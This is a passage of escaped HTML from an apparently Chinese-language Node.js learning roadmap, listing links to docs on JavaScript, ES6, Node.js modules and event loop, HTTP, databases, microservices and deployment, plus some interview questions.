href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md\">[more]</a>\n<ul>\n<li><code>[RegExp]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md#%E6%A8%A1%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6%E5%8F%82%E6%95%B0\">模式修饰符参数</a></li>\n<li><code>[RegExp]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md#%E4%B8%A4%E4%B8%AA%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95\">两个测试方法</a></li>\n<li><code>[RegExp]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md#4%E4%B8%AA%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%96%B9%E6%B3%95\">4个正则表达式方法</a></li>\n<li><code>[RegExp]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md#%E5%8C%B9%E9%85%8D%E6%A8%A1%E5%BC%8F\">匹配模式</a></li>\n<li><code>[RegExp]</code>  <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/javascript/regexp.md#%E5%B8%B8%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F\">常用正则表达式</a></li>\n</ul>\n</li>\n</ul>\n<h2>ECMAScript6</h2>\n<ul>\n<li><strong>变量声明</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md\">[more]</a>\n<ul>\n<li><code>[Variable]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E6%96%B0%E5%A2%9E%E5%A3%B0%E6%98%8E%E5%8F%98%E9%87%8F\">新增let&amp;const变量声明</a></li>\n</ul>\n</li>\n<li><strong>解构赋值</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC\">[more]</a>\n<ul>\n<li><code>[Deconstruction]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E6%95%B0%E7%BB%84%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC\">数组解构赋值</a></li>\n<li><code>[Deconstruction]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E5%AF%B9%E8%B1%A1%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC\">对象解构赋值</a></li>\n</ul>\n</li>\n<li><strong>扩展系列</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC\">[more]</a>\n<ul>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%89%A9%E5%B1%95\">正则表达式扩展</a></li>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A9%E5%B1%95\">字符串扩展</a></li>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E6%95%B0%E5%80%BC%E6%89%A9%E5%B1%95\">数值扩展</a></li>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E6%95%B0%E7%BB%84%E6%89%A9%E5%B1%95\">数组扩展</a></li>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E5%87%BD%E6%95%B0%E6%89%A9%E5%B1%95\">函数扩展</a></li>\n<li><code>[Extension]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/readme.md#%E5%AF%B9%E8%B1%A1%E6%89%A9%E5%B1%95\">对象扩展</a></li>\n</ul>\n</li>\n<li><strong>集合系列</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC\">[more]</a>\n<ul>\n<li><code>[Set]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#set\">集合Set</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#weakset\">WeakSet</a></li>\n<li><code>[Map]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#map\">集合Map</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#weakmap\">WeakMap</a></li>\n<li><code>[Map-Array]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#map%E4%B8%8Earray%E5%AF%B9%E6%AF%94\">Map与Array横向对比增、查、改、删</a></li>\n<li><code>[Set-Array]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#set%E4%B8%8Earray\">Set与Array增、查、改、删对比</a></li>\n<li><code>[Map-Set-Array]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/set-map.md#%E9%9B%86%E5%90%88map%E9%9B%86%E5%90%88set%E5%AF%B9%E8%B1%A1%E4%B8%89%E8%80%85%E5%AF%B9%E6%AF%94\">Map、Set、Object三者增、查、改、删对比</a></li>\n</ul>\n</li>\n<li><strong>Promise</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md\">[more]</a>\n<ul>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#promise%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E5%8E%9F%E7%90%86\">Promise的基本使用和原理</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#callback%E6%96%B9%E5%BC%8F%E4%B9%A6%E5%86%99\">Callback方式书写</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#promise%E6%96%B9%E5%BC%8F%E4%B9%A6%E5%86%99\">Promise方式书写</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#finally\">Promise.finally()</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#promise%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C\">Promise并行执行 Promise.all()</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#promise%E7%8E%87%E5%85%88%E6%89%A7%E8%A1%8C\">Promise率先执行 Promise.race()</a></li>\n<li><code>[Promise]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#%E9%94%99%E8%AF%AF%E6%8D%95%E8%8E%B7\">错误捕获</a></li>\n<li><code>[面试]</code> <code>Promise 中 .then 的第二参数与 .catch 有什么区别?</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#%E9%94%99%E8%AF%AF%E6%8D%95%E8%8E%B7\">错误捕获</a></li>\n<li><code>[面试]</code> <code>怎么让一个函数无论promise对象成功和失败都能被调用？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/promise.md#finally\">finally</a></li>\n</ul>\n</li>\n<li><strong>Decorators</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/decorators.md\">[more]</a></li>\n<li><strong>Symbol</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/symbol.md\">[more]</a></li>\n<li><strong>Generator</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/es6/generator.md\">[more]</a></li>\n</ul>\n<h2>Nodejs</h2>\n<ul>\n<li><strong>模块</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md\">[more]</a>\n<ul>\n<li><code>[Module]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E6%A8%A1%E5%9D%97%E7%9A%84%E5%88%86%E7%B1%BB\">模块的分类</a>：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E7%B3%BB%E7%BB%9F%E6%A8%A1%E5%9D%97\">系统模块</a>、<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%A8%A1%E5%9D%97\">第三方模块</a></li>\n<li><code>[Module]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6\">模块加载机制</a></li>\n<li><code>[Module]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E6%A8%A1%E5%9D%97%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8\">模块循环引用</a></li>\n<li><code>[面试]</code> <code>require的加载机制？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6\">模块加载机制</a></li>\n<li><code>[面试]</code> <code>module.exports与exports的区别</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#module.exports%E4%B8%8Eexports%E7%9A%84%E5%8C%BA%E5%88%AB\">module.exports与exports的区别</a></li>\n<li><code>[面试]</code> <code>假设有a.js、b.js两个模块相互引用，会有什么问题？是否为陷入死循环？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E9%97%AE%E9%A2%981\">#</a></li>\n<li><code>[面试]</code> <code>a模块中的undeclaredVariable变量在b.js中是否会被打印？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/module.md#%E9%97%AE%E9%A2%982\">#</a></li>\n</ul>\n</li>\n<li><strong>事件轮询（Event Loop）</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md\">[more]</a>\n<ul>\n<li><code>[EventLoop]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#%E7%BA%BF%E7%A8%8B%E6%A8%A1%E5%9E%8B\">线程模型、EventLoop介绍</a></li>\n<li><code>[I/O]</code><a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AE%E8%AF%A2%E6%8A%80%E6%9C%AF%E6%BC%94%E8%BF%9B\">操作系统I/O模型及轮询技术演变</a></li>\n<li><code>[I/O]</code><a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#%E7%99%BD%E8%AF%9D%E9%A3%8E%E6%A0%BC\">白话风格（小明与妹子的邂逅）讲解I/O演进</a></li>\n<li><code>[Node.js-EventLoop]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#Node.js%E4%B8%AD%E7%9A%84EventLoop\">Node.js中的Event Loop</a></li>\n<li><code>[Browser-EventLoop]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84EventLoop\">浏览器中的Event Loop</a></li>\n<li><code>[Interview]</code> <code>I/O多路复用轮询技术select和epoll的区别？</code>，参考：<a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/event-loop.md#select%E5%92%8Cepoll%E7%9A%84%E5%8C%BA%E5%88%AB\">#</a></li>\n</ul>\n</li>\n<li><strong>中间件</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/middleware.md\">[more]</a>\n<ul>\n<li><code>[Mddleware]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/nodejs/middleware.md\">常用Web框架&amp;中间件汇总</a></li>\n</ul>\n</li>\n<li><strong>缓存</strong>\n<ul>\n<li><code>[Cache]</code> <a href=\"https://github.com/webpack/memory-fs\">memory-fs 将文件写入内存</a></li>\n<li><code>[Cache]</code> <a href=\"https://github.com/ptarjan/node-cache#readme\">Memory Cache</a></li>\n<li><code>[Cache]</code> <a href=\"https://github.com/mpneuried/nodecache\">Node Cache</a></li>\n</ul>\n</li>\n<li><strong>定时任务</strong>\n<ul>\n<li><code>[Schedule]</code> <a href=\"https://github.com/node-schedule/node-schedule\">node-schedule </a></li>\n<li><code>[Schedule]</code> <a href=\"https://github.com/agenda/agenda\">Agenda 将Node中的定时任务存储在数据库中（官方推荐MongoDB）</a></li>\n</ul>\n</li>\n<li><strong>模板引擎</strong>\n<ul>\n<li><code>[Template]</code> <a href=\"https://ejs.co/\">Ejs</a></li>\n<li><code>[Template]</code> <a href=\"https://handlebarsjs.com/\">Handlebarsjs</a></li>\n<li><code>[Template]</code> <a href=\"http://jade-lang.com/\">Jade</a></li>\n</ul>\n</li>\n<li><strong>日志记录收集</strong>\n<ul>\n<li><code>[Logger]</code> <a href=\"https://sentry.io/welcome/\">Sentry–错误日志收集框架</a></li>\n<li><code>[Logger]</code> <a href=\"https://github.com/log4js-node/log4js-node\">log4js 日志记录工具</a></li>\n<li><code>[Logger]</code> <a href=\"https://www.elastic.co/cn/products\">ELK–开源的日志分析系统</a></li>\n<li><code>[Logger]</code> <a href=\"https://github.com/winstonjs/winston\">winston日志模块</a></li>\n</ul>\n</li>\n<li><strong>测试</strong>\n<ul>\n<li><code>Unit Testing</code> <a href=\"https://mochajs.org/\">mocha NodeJS里最常用的测试框架</a></li>\n<li><code>Unit Testing</code> <a href=\"http://www.chaijs.com/api/\">chai 一个断言库</a></li>\n<li><code>Unit Testing</code> <a href=\"https://jestjs.io/\">Jest — Facebook推出的一款测试框架，集成了 Mocha，chai，jsdom，sinon等功能。</a></li>\n<li><code>BDD Testing</code> <a href=\"https://jasmine.github.io/\">Jasmine — 一款基于行为驱动的JavaScript测试框架</a></li>\n<li><code>Testing Tool</code> <a href=\"https://github.com/gotwarlost/istanbul\">istanbul Istanbul - a JS code coverage tool written in JS 测试覆盖率</a></li>\n<li><code>E2E Testing</code> <a href=\"https://github.com/GoogleChrome/puppeteer\">Puppeteer</a></li>\n</ul>\n</li>\n<li><strong>框架</strong>\n<ul>\n<li><code>[Framework]</code> <a href=\"http://www.expressjs.com.cn/\">Express 中文版</a>、<a href=\"http://www.expressjs.com.cn/\">Express of English Version</a></li>\n<li><code>[Framework]</code> <a href=\"https://koajs.com/\">Koa 中文版</a>、<a href=\"https://koajs.com/\">Koa of English Version</a></li>\n<li><code>[Framework]</code> <a href=\"https://eggjs.org/zh-cn/intro/quickstart.html\">Egg 中文版</a>、<a href=\"https://eggjs.org/en/intro/quickstart.html\">Egg of English Version</a></li>\n<li><code>[Framework]</code> <a href=\"https://docs.nestjs.cn/\">Nest.js 中文版</a>、<a href=\"https://docs.nestjs.com/\">Nest.js</a></li>\n</ul>\n</li>\n<li><strong>ORM</strong>\n<ul>\n<li><code>[typeorm]</code> <a href=\"https://typeorm.io/\">typeorm</a> 【右上角切换中文】</li>\n<li><code>[sequelize]</code> <a href=\"http://docs.sequelizejs.com/\">sequelize</a></li>\n<li><code>[prisma]</code> <a href=\"https://www.prisma.io/docs\">prisma</a></li>\n</ul>\n</li>\n</ul>\n<h2>DataBase</h2>\n<ul>\n<li><strong><code>Relational</code></strong>\n<ul>\n<li><a href=\"https://www.mysql.com/\">MySql</a></li>\n<li><a href=\"https://www.microsoft.com/en-us/sql-server/sql-server-2017\">SQL Server</a></li>\n<li><a href=\"https://www.postgresql.org/\">PostgreSQL</a></li>\n<li><a href=\"https://www.oracle.com/index.html\">Oracle</a></li>\n</ul>\n</li>\n<li><strong><code>NoSQL</code></strong>\n<ul>\n<li><a href=\"https://www.mongodb.com/\">MongoDB</a></li>\n<li><a href=\"https://redis.io/\">Redis</a></li>\n<li><a href=\"https://github.com/facebook/rocksdb/\">RocksDB</a>、<a href=\"https://rocksdb.org.cn/\">RocksDB中文网</a></li>\n<li><a href=\"http://couchdb.apache.org/\">CouchDB</a></li>\n</ul>\n</li>\n<li><strong>Search Engines</strong>\n<ul>\n<li><a href=\"https://www.elastic.co/\">ElasticSearch</a></li>\n<li><a href=\"http://lucene.apache.org/solr/\">Solr</a></li>\n<li><a href=\"http://sphinxsearch.com/\">Sphinxsearch</a></li>\n</ul>\n</li>\n</ul>\n<h2>Microservice</h2>\n<ul>\n<li><strong>服务注册发现之Consul</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md\">[more]</a>\n<ul>\n<li><code>[Consul]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md#%E4%BD%BF%E7%94%A8consul%E8%A7%A3%E5%86%B3%E4%BA%86%E5%93%AA%E4%BA%9B%E9%97%AE%E9%A2%98\">使用Consul解决了哪些问题</a></li>\n<li><code>[Consul]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md#consul%E6%9E%B6%E6%9E%84\">微服务Consul系列之服务部署、搭建、使用</a></li>\n<li><code>[Consul]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md#%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA\">微服务Consul系列之集群搭建</a></li>\n<li><code>[Consul]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md#%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%8E%E5%8F%91%E7%8E%B0\">微服务Consul系列之服务注册与服务发现</a></li>\n<li><code>[Question]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/consul.md#%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93\">微服务Consul系列之问题汇总篇</a></li>\n</ul>\n</li>\n<li><strong>消息中间件之RabbitMQ</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/rabbitmq-base.md\">[more]</a>\n<ul>\n<li><code>[RabbitMQ]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/rabbitmq-base.md#%E4%B8%BB%E6%B5%81%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%AE%80%E4%BB%8B\">主流消息中间件简介</a></li>\n<li><code>[RabbitMQ]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/microservice/rabbitmq-base.md#%E5%AE%89%E8%A3%85\">RabbitMQ安装、部署、启动</a>\n<ul>\n<li>Mac版安装</li>\n<li>Linux系统（Ubuntu、CentOS）安装</li>\n<li>运行与启动</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>轻量级数据通信</strong>\n<ul>\n<li><code>[RPC]</code> <a href=\"http://doc.oschina.net/grpc?t=57966\">gRPC 官方文档中文版</a></li>\n<li><code>[RPC]</code> <a href=\"http://thrift.apache.org/\">Apache Thrift</a></li>\n<li><code>[RPC]</code> <a href=\"http://dubbo.apache.org/zh-cn/index.html\">Apache Dubbo一款高性能Java RPC框架</a></li>\n<li><code>[HTTP]</code> <a href=\"http://www.ruanyifeng.com/blog/2014/05/restful_api.html\">RESTful API 设计指南</a> <a href=\"https://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api#versioning\">Best Practices for Designing a Pragmatic RESTful API\n</a></li>\n</ul>\n</li>\n</ul>\n<h2>HTTP协议</h2>\n<ul>\n<li><strong>http三次握手</strong> <a href=\"https://github.com/Q-Angelo/http-protocol#http%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B\">[more]</a>\n<ul>\n<li><code>[HTTP三次握手]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E6%97%B6%E5%BA%8F%E5%9B%BE\">三次握手时序图</a></li>\n<li><code>[HTTP三次握手]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E6%95%B0%E6%8D%AE%E5%8C%85%E8%AF%A6%E7%BB%86%E5%86%85%E5%AE%B9%E5%88%86%E6%9E%90\">三次握手数据包详细内容分析</a></li>\n<li><code>[HTTP三次握手]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E6%80%BB%E7%BB%93\">分析总结</a></li>\n<li><code>[面试]</code> <code>说下TCP三次握手的过程?</code>，参考：<a href=\"https://github.com/Q-Angelo/http-protocol#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E6%97%B6%E5%BA%8F%E5%9B%BE\">三次握手时序图</a></li>\n</ul>\n</li>\n<li><strong>跨域CORS</strong> <a href=\"https://github.com/Q-Angelo/http-protocol#%E8%B7%A8%E5%9F%9Fcors\">[more]</a>\n<ul>\n<li><code>[CORS]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E8%B7%A8%E5%9F%9Fcors\">跨域形成原理简介</a></li>\n<li><code>[CORS]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E7%A4%BA%E4%BE%8B\">实例来验证跨域的产生过程</a></li>\n<li><code>[CORS]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E5%9F%BA%E4%BA%8Ehttp%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E7%9A%84%E5%87%A0%E7%A7%8D%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95\">基于http协议层面的几种解决办法</a></li>\n<li><code>[CORS]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#cors%E9%A2%84%E8%AF%B7%E6%B1%82\">CORS预请求</a></li>\n<li><code>[面试]</code> <code>你之前遇见过跨域吗？说一下跨域的形成与实现。</code>，参考：<a href=\"https://github.com/Q-Angelo/http-protocol#%E8%B7%A8%E5%9F%9Fcors\">CORS</a></li>\n</ul>\n</li>\n<li><strong>缓存头Cache-Control的含义和使用</strong>\n<ul>\n<li><code>[Cache-Control]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E5%8F%AF%E7%BC%93%E5%AD%98%E6%80%A7\">可缓存性（public、private、no-cache）</a></li>\n<li><code>[Cache-Control]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E5%88%B0%E6%9C%9F\">到期 （max-age、s-maxage、max-stale）</a></li>\n<li><code>[Cache-Control]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E9%87%8D%E6%96%B0%E9%AA%8C%E8%AF%81\">重新验证 （must-revalidate、proxy-revalidate）</a></li>\n<li><code>[Cache-Control]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E5%85%B6%E5%AE%83\">其它 （no-store、no-transform）</a></li>\n<li><code>[Cache-Control]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E7%BC%93%E5%AD%98cache-control%E7%A4%BA%E4%BE%8B\">缓存cache-control示例</a></li>\n</ul>\n<ol>\n<li><code>[思考]</code> <code>在页面中引入静态资源文件，为什么静态资源文件改变后，再次发起请求还是之前的内容，没有变化呢？</code>，参考：<a href=\"https://github.com/Q-Angelo/http-protocol#%E7%BC%93%E5%AD%98cache-control%E7%A4%BA%E4%BE%8B\">#</a></li>\n<li><code>[思考]</code> <code>在使用webpack等一些打包工具时，为什么要加上一串hash码？</code>，参考：<a href=\"https://github.com/Q-Angelo/http-protocol#%E7%BC%93%E5%AD%98cache-control%E7%A4%BA%E4%BE%8B\">#</a></li>\n</ol>\n</li>\n<li><strong>HTTP长链接</strong>\n<ul>\n<li><code>[KeepAlive]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#http%E9%95%BF%E9%93%BE%E6%8E%A5\">http长链接简介</a></li>\n<li><code>[KeepAlive]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#http%E9%95%BF%E9%93%BE%E6%8E%A5\">http/1.1中长链接的实现示例</a></li>\n<li><code>[KeepAlive]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#http%E9%95%BF%E9%93%BE%E6%8E%A5\">长链接在http2中的应用与http/1.1协议中的对比</a></li>\n<li><code>[面试]</code> <code>Chrome浏览器允许的一次性最大TCP并发链接是几个？</code>，参考：<a href=\"https://github.com/Q-Angelo/http-protocol#http%E9%95%BF%E9%93%BE%E6%8E%A5\">HTTP长链接分析</a></li>\n</ul>\n</li>\n<li><strong>Nginx服务配置</strong>\n<ul>\n<li><code>[Nginx]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#nginx%E5%AE%89%E8%A3%85%E5%90%AF%E5%8A%A8\">Nginx安装启动</a></li>\n<li><code>[Nginx]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E4%BF%AE%E6%94%B9hosts%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE%E6%9C%AC%E5%9C%B0%E5%9F%9F%E5%90%8D\">修改hosts文件配置本地域名</a></li>\n<li><code>[Nginx]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#nginx%E9%85%8D%E7%BD%AE%E7%BC%93%E5%AD%98\">Nginx配置缓存</a></li>\n<li><code>[Nginx]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#nginx%E9%83%A8%E7%BD%B2https%E6%9C%8D%E5%8A%A1\">nginx部署https服务</a></li>\n<li><code>[Nginx]</code> <a href=\"https://github.com/Q-Angelo/http-protocol#%E5%AE%9E%E7%8E%B0http2%E5%8D%8F%E8%AE%AE\">实现http2协议</a></li>\n</ul>\n</li>\n</ul>\n<h2>DevOps</h2>\n<ul>\n<li><strong>Node.js生产环境完整部署指南</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md\">[more]</a>\n<ul>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86%E5%8F%8A%E7%99%BB%E9%99%86%E6%9C%8D%E5%8A%A1%E5%99%A8\">用户权限管理及登陆服务器</a></li>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#%E5%A2%9E%E5%BC%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%89%E5%85%A8%E7%AD%89%E7%BA%A7\">增强服务器安全等级</a></li>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#nodejs%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2\">Node.js生产环境部署</a></li>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#nginx%E6%98%A0%E5%B0%84\">Nginx端口映射</a></li>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#mongodb\">Mongodb生产环境部署</a></li>\n<li><code>[Node.js]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/node-deploy.md#%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E5%90%8C%E6%AD%A5%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BB%93%E5%BA%93%E8%BF%9B%E8%A1%8C%E7%94%9F%E4%BA%A7%E9%83%A8%E7%BD%B2\">实现服务器与第三方仓库的关联-PM2代码部署</a></li>\n</ul>\n</li>\n<li><strong>NPM模块管理</strong> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/npm-deploy.md\">[more]</a>\n<ul>\n<li><code>[NPM]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/npm-deploy.md#npm%E6%BA%90%E8%AE%BE%E7%BD%AE\">npm源设置</a></li>\n<li><code>[NPM]</code> <a href=\"https://github.com/Q-Angelo/Nodejs-Roadmap/blob/master/docs/devops/npm-deploy.md#npm%E6%B3%A8%E5%86%8C%E7%99%BB%E5%BD%95\">nnpm注册登录</a></li>\n<li><code>[NPM]</code> <a 